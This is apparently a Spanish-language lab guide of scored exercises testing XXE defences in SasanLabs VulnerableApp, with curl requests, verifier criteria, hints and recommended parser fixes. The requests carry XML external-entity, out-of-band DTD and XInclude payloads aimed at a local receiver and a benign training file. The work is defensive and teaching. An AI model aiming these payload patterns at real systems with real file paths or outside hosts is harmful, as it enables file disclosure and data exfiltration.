Control negativo desde Kali: curl -i -X POST http://target:9090/VulnerableApp/XXEVulnerability/LEVEL_2 -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?><book><name>control</name><isbn>2</isbn><author>a</author><publisher>p</publisher><others>no-dtd</others></book>' y revisar que el receptor no registre xxe-marker.

Caso de entrenamiento desde Kali: curl -i -X POST http://target:9090/VulnerableApp/XXEVulnerability/LEVEL_2 -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?><!DOCTYPE book SYSTEM "http://receiver:8081/xxe-training.dtd"><book><name>ok</name><isbn>2</isbn><author>a</author><publisher>p</publisher><others>receiver-control</others></book>'

Verificar manualmente sólo en receiver:8081 si hubo la solicitud autorizada. Un HTTP 200 de target no demuestra que la DTD se cargó ni que se produjo exfiltración; el método convierte excepciones en 200/isValid=false.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Revisar en el receptor inocuo que no llegó ninguna solicitud de xxe-marker en el control sin DOCTYPE y que, con el DOCTYPE SYSTEM de entrenamiento, sólo llegó una solicitud local autorizada cuyo valor observado es VA_LAB_FILE; no usar un dominio externo ni un archivo distinto."
}
```

**Pistas:**

No pongas %file dentro de otra declaración del subconjunto interno: el propio recurso de mensajes advierte que esa forma no es XML bien formado.

El receptor es local y de laboratorio; no sustituyas receiver por attacker.example ni por Internet.

La ausencia de una entrada en el receptor sólo es interpretable si se confirmó primero que su DTD de entrenamiento existe y registra solicitudes.

**Corrección recomendada:** Además de external-general-entities=false, establecer external-parameter-entities=false y load-external-dtd=false; usar un resolver externo que rechace por defecto y validar el esquema. Mantener la salida de red del servicio restringida incluso después de corregir el parser.

### xxe-03 · LEVEL_3 negativo: entidades externas desactivadas, sin leer ni llamar al receptor

La configuración fuente desactiva external-general-entities y external-parameter-entities; no debería observarse una solicitud a receiver:8081/xxe-level3 ni aparecer un contenido externo. JAXB puede producir un Book válido con campo vacío, una referencia no expandida o un bean inválido según parser/runtime.

**Puntaje:** 60 XP. Evidencia observada por el runner de Kali.

Este es el control positivo de la defensa respecto de acceso externo: se usa un URI local inocuo, no un secreto. LEVEL_3 permite DOCTYPE, por lo que el resultado no debe confundirse con el rechazo total de LEVEL_4; su debilidad residual es la expansión interna no acotada.

Registrar el estado inicial del receptor inocuo, sin generar tráfico externo. El URI usado sólo contiene el marcador benigno VA_LAB_OK.

Desde Kali: curl -i -X POST http://target:9090/VulnerableApp/XXEVulnerability/LEVEL_3 -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?><!DOCTYPE book [<!ENTITY xxe SYSTEM "http://receiver:8081/xxe-level3?marker=VA_LAB_OK">]><book><name>ok</name><isbn>3</isbn><author>a</author><publisher>p</publisher><others>&xxe;</others></book>'

Comprobar que la respuesta, si es JSON, no contiene VA_LAB_OK y revisar opcionalmente los registros del receptor para confirmar ausencia de /xxe-level3. Repetir con XML normal sin DOCTYPE como control positivo de funcionamiento de negocio.

No interpretar un content vacío, una referencia textual o un 200 como prueba absoluta de seguridad: el check sólo verifica que el marcador no apareció y la observación OOB depende de los logs del receptor.

Registrar la misma prueba con el cliente del laboratorio:
lab request xxe-03 --method POST --body '<?xml version="1.0"?><!DOCTYPE book [<!ENTITY xxe SYSTEM "http://receiver:8081/xxe-level3?marker=VA_LAB_OK">]><book><name>ok</name><isbn>3</isbn><author>a</author><publisher>p</publisher><others>&xxe;</others></book>' --content-type application/xml

**Criterio del verificador:**

```json
{
  "kind": "not_contains",
  "value": "VA_LAB_OK"
}
```

**Pistas:**

El objetivo es un control negativo de resolución externa, no una prueba de XML bomb.

La etiqueta SECURE de este nivel no elimina el riesgo de expansión interna no acotada.

No medir seguridad por hacer clic en la UI; la evidencia debe ser la respuesta estructurada y, para OOB, el receptor.

**Corrección recomendada:** Conservar ambas flags de entidades externas en falso, impedir DTD externos y añadir límite de expansión; si la aplicación no necesita DOCTYPE, preferir la estrategia de LEVEL_4. Aplicar además límites de tamaño y tiempo fuera del parser.

### xxe-04 · LEVEL_4 negativo: cualquier DOCTYPE es rechazado

El parser debería rechazar el documento antes de deserializarlo porque contiene DOCTYPE, aunque la entidad sea interna y no acceda a un recurso. El código fuente devuelve HTTP 200 en el catch y un bean con isValid=false/content=null.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El caso prueba la diferencia entre desactivar entidades y prohibir la construcción completa de DOCTYPE. Es seguro porque la entidad sólo contiene la palabra DOCTYPE_PRESENT y nunca apunta a file, http o un recurso de red.

Control positivo de negocio: primero enviar un <book> normal sin DOCTYPE a LEVEL_4 y verificar, si el runtime lo permite, isValid=true y un content no nulo.

Caso seguro desde Kali: curl -i -X POST http://target:9090/VulnerableApp/XXEVulnerability/LEVEL_4 -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?><!DOCTYPE book [<!ENTITY local "DOCTYPE_PRESENT">]><book><name>ok</name><isbn>4</isbn><author>a</author><publisher>p</publisher><others>&local;</others></book>'

Comprobar el JSON isValid=false y content=null. Si la capa HTTP transforma la respuesta, conservar el cuerpo crudo y no reemplazar esta verificación por el código 200.

No añadir una entidad externa para hacer la prueba más fuerte: la prohibición de DOCTYPE ya es el comportamiento que se quiere verificar.

Registrar la misma prueba con el cliente del laboratorio:
lab request xxe-04 --method POST --body '<?xml version="1.0"?><!DOCTYPE book [<!ENTITY local "DOCTYPE_PRESENT">]><book><name>ok</name><isbn>4</isbn><author>a</author><publisher>p</publisher><others>&local;</others></book>' --content-type application/xml

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": false
}
```

**Pistas:**

La comprobación correcta es el cuerpo JSON, no un status 200.

Un DOCTYPE inofensivo basta para probar disallow-doctype-decl.

La ausencia de una navegación de UI no invalida el resultado; el endpoint acepta POST XML.

**Corrección recomendada:** Mantener disallow-doctype-decl=true cuando la aplicación no requiere DOCTYPE. Para entradas XML rechazadas, usar un código de error HTTP coherente en una aplicación real y no ocultar fallos de validación bajo un 200 ambiguo.

### xxe-05 · LEVEL_5 negativo: XInclude local no debe insertar el marcador

No debería aparecer VA_LAB_FILE en la respuesta porque setXIncludeAware(false) impide procesar la directiva. Según JAXB/parser, el documento puede ser inválido por el elemento hijo inesperado o puede producir un name vacío; ambas variantes son compatibles con la ausencia del marcador.

**Puntaje:** 60 XP. Evidencia observada por el runner de Kali.

El caso cubre la defensa adicional que distingue LEVEL_5 de una simple prohibición de DOCTYPE: xi:include no necesita una declaración DOCTYPE. Sólo referencia el archivo de entrenamiento permitido y no un archivo del host.

Precondición: no cambiar file:///tmp/va-training.txt; debe ser el marcador autorizado VA_LAB_FILE.

Control positivo de negocio: enviar primero XML normal sin xi:include a LEVEL_5 y observar sólo que el flujo de libro puede funcionar; no usar ese 200 como prueba de que XInclude está deshabilitado.

Desde Kali: curl -i -X POST http://target:9090/VulnerableApp/XXEVulnerability/LEVEL_5 -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?><book xmlns:xi="http://www.w3.org/2001/XInclude"><name><xi:include href="file:///tmp/va-training.txt" parse="text"/></name><isbn>5</isbn><author>a</author><publisher>p</publisher><others>xinclude-control</others></book>'

Buscar VA_LAB_FILE en el cuerpo JSON y, si es necesario, clasificar manualmente isValid/content por separado. El check sólo demuestra que el marcador no fue reflejado; no promete que cada implementación JAXB produzca la misma forma de error.

Registrar la misma prueba con el cliente del laboratorio:
lab request xxe-05 --method POST --body '<?xml version="1.0"?><book xmlns:xi="http://www.w3.org/2001/XInclude"><name><xi:include href="file:///tmp/va-training.txt" parse="text"/></name><isbn>5</isbn><author>a</author><publisher>p</publisher><others>xinclude-control</others></book>' --content-type application/xml

**Criterio del verificador:**

```json
{
  "kind": "not_contains",
  "value": "VA_LAB_FILE"
}
```

**Pistas:**

XInclude es una característica distinta de las entidades XML.

La prueba es segura sólo con el archivo de entrenamiento autorizado.

No uses un click en la UI como criterio de éxito o fracaso; captura el POST y el JSON.

**Corrección recomendada:** Mantener XInclude desactivado en parsers que procesen XML no confiable, además de las defensas de DTD/entidades externas. Rechazar elementos inesperados mediante validación de esquema y política de namespaces.

### xxe-06 · LEVEL_6 control seguro: expansión interna pequeña, nunca XML bomb

Expansión acotada a 3 repeticiones de un marcador de 9 caracteres, por debajo de NAME VARCHAR(30). No usar cargas exponenciales ni DoS.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El test existente usa precisamente una expansión de cinco repeticiones para verificar el flujo normal. Aquí se conserva esa escala mínima y se evita cualquier payload de agotamiento de CPU/memoria. El nivel sigue siendo riesgoso porque configura el límite en cero/sin límite y no desactiva entidades externas.

Lee el objetivo y contrasta la entrada con su mitigación. La siguiente receta usa la distribución y fixtures de este proyecto.

```bash
lab request xxe-06 --method POST --body '<?xml version="1.0"?><!DOCTYPE book [<!ENTITY p "VA_LAB_OK"><!ENTITY p1 "&p;&p;&p;">]><book><name>&p1;</name><isbn>6</isbn><author>a</author><publisher>p</publisher><others>ok</others></book>' --content-type application/xml
```

Observa success, awarded y la evidencia devuelta; repetir una misión lograda no duplica sus puntos.

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "content.name",
  "value": "VA_LAB_OKVA_LAB_OKVA_LAB_OK"
}
```

**Pistas:**

La palabra clave es pequeña: cinco expansiones, no una bomba.

Un 429 puede ser una defensa del semáforo, no una prueba de vulnerabilidad.

Un resultado válido no prueba que el timeout detendría cualquier entrada maliciosa.

**Corrección recomendada:** Usar un límite bajo y probado de expansión, como la intención de LEVEL_7, desactivar entidades externas/DTD/XInclude y aplicar límites de tamaño/tiempo. El semáforo y timeout de este nivel son defensas operativas complementarias, no sustitutos de configuración segura.

### xxe-07 · LEVEL_7 negativo: entidad externa local bloqueada con expansión limitada

El código desactiva external-general-entities y external-parameter-entities y no carga DTD externos; no debería aparecer VA_LAB_FILE en la respuesta. Un XML normal o una expansión interna pequeña debe seguir siendo el control positivo de funcionamiento, sin superar el límite 20.

**Puntaje:** 60 XP. Evidencia observada por el runner de Kali.

El DOCTYPE se deja presente para comprobar que LEVEL_7 no depende sólo de rechazarlo: la entidad externa apunta al único archivo de entrenamiento permitido y la salida esperada no debe contener el marcador. La configuración de límite se mantiene, pero el ejercicio no intenta alcanzar el umbral.

Precondición: usar sólo file:///tmp/va-training.txt con VA_LAB_FILE; no cambiar el URI por otra ruta.

Control positivo de negocio: enviar un libro XML sin DOCTYPE a LEVEL_7 y observar que una entrada normal puede ser válida. No se debe crear carga para probar el límite 20.

Desde Kali: curl -i -X POST http://target:9090/VulnerableApp/XXEVulnerability/LEVEL_7 -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?><!DOCTYPE book [<!ENTITY xxe SYSTEM "file:///tmp/va-training.txt">]><book><name>ok</name><isbn>7</isbn><author>a</author><publisher>p</publisher><others>&xxe;</others></book>'

Confirmar que el cuerpo no contiene VA_LAB_FILE. Si la respuesta es inválida por diferencias del parser, anotar isValid/content y no repetir con una expansión mayor; la ausencia del marcador es el único check automatizado propuesto.

Registrar la misma prueba con el cliente del laboratorio:
lab request xxe-07 --method POST --body '<?xml version="1.0"?><!DOCTYPE book [<!ENTITY xxe SYSTEM "file:///tmp/va-training.txt">]><book><name>ok</name><isbn>7</isbn><author>a</author><publisher>p</publisher><others>&xxe;</others></book>' --content-type application/xml

**Criterio del verificador:**

```json
{
  "kind": "not_contains",
  "value": "VA_LAB_FILE"
}
```

**Pistas:**

LEVEL_7 permite DOCTYPE, pero no debería resolver la entidad externa.

El límite 20 no se valida provocando una expansión por encima del umbral.

Reflejar o no reflejar el marcador no debe evaluarse por clicks; usa el JSON crudo.

**Corrección recomendada:** Mantener las dos flags de entidades externas en falso, la carga de DTD externo desactivada, XInclude desactivado y un límite de expansión probado. Si DOCTYPE no es necesario, añadir también disallow-doctype-decl para reducir superficie.

### Límites de esta familia

[
  "Este documento es una revisión estática del commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a; no afirma que se hayan ejecutado target, Mailpit o receiver ni que un ejercicio haya funcionado en el runtime desplegado.",
  "Todas las rutas de esta familia son POST según las anotaciones. Los comandos usan curl -X POST y --data-binary; curl --get sería un método incorrecto para comprobar el comportamiento de estos métodos.",
  "El código captura la mayoría de excepciones y devuelve HTTP 200 con GenericVulnerabilityResponseBean isValid=false/content=null. Por ello un 200 no prueba aceptación, expansión de entidad ni ausencia de vulnerabilidad.",
  "Un reflejo de texto en JSON o HTML no prueba ejecución XSS; aquí no se usa JavaScript, no se roban cookies y no se debe atribuir puntaje por hacer click. Para este XML, verificar valores JSON y los logs del receptor cuando el comportamiento es fuera de banda.",
  "La ausencia de un registro en receiver sólo es evidencia si se confirmó que la ruta de DTD/endpoint de entrenamiento existe, es local, registra solicitudes y responde de forma controlada. La revisión no inventa el contrato de receiver: si no expone /xxe-training.dtd, LEVEL_2 queda como ejercicio condicionado y no como resultado observado.",
  "Mailpit no es necesario para los siete métodos XXE analizados: el código sólo guarda BookEntity y no contiene envío de correo. No se propone usar Mailpit como verificador de esta familia.",
  "El archivo /tmp/va-training.txt y el marcador VA_LAB_FILE son una precondición de laboratorio; no se leen secretos del host ni se incluyen rutas como /etc/passwd, /etc/hostname, win.ini u otros archivos sensibles.",
  "Los mensajes del repositorio describen payloads pedagógicos más agresivos, incluido Billion Laughs y una lectura de /etc/hostname, pero este informe los sustituye por controles seguros. No se incluyen DoS, reverse shells, comandos externos, borrado de datos ni servidores atacantes.",
  "El test de LEVEL_3 sólo comprueba que un contenido malicioso no aparece como valor esperado y los tests de LEVEL_6/LEVEL_7 usan expansiones pequeñas. Las diferencias de JDK, JAXB, SAXParserFactory y propiedades entityExpansionLimit pueden cambiar si el resultado es un bean válido, vacío o inválido.",
  "La anotación SECURE expresa la variante pedagógica del repositorio y no sustituye una revisión de límites de tamaño, timeouts de servidor, validación de esquema, política de salida de red, observabilidad y pruebas del runtime exacto.",
  "La propiedad global javax.xml.accessExternalDTD=all se establece en el constructor de XXEVulnerability y puede afectar otros parsers del proceso; el análisis se limita a sus efectos observables en esta familia."
]

## Procedencia y alcance

La guía se deriva del código y pruebas del original; las expectativas estáticas no equivalen a una ejecución de todo el stack en cada sistema operativo. Consulta `docs/VALIDACION.md` para saber qué pruebas se realizaron y cuáles debes ejecutar en tu entorno.

Fuentes: [repositorio original](https://github.com/SasanLabs/VulnerableApp), [documentación original](https://sasanlabs.github.io/VulnerableApp), [Qwen3](https://ollama.com/library/qwen3), [herramientas Ollama](https://docs.ollama.com/capabilities/tool-calling).
